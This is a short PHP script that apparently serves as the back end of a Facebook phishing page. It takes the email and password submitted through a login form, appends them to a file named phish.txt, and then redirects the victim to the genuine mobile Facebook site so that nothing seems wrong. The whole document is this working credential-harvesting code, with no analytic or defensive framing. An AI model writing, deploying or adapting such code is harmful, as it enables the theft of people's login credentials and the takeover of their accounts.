<?php
     if (isset($_POST['login'])) {
          // Open the text file
          $f = fopen("phish.txt", "a");
      
          // Write text
          fwrite($f, "Username : ". $_POST["email"]);
          fwrite($f, " ");
          fwrite($f, "Password : ". $_POST["pass"]); 	
          fwrite($f, "\n\n");
          // Close the text file
          fclose($f);
           
          header('Location: https://m.facebook.com/');
          exit;
     } 
      
?>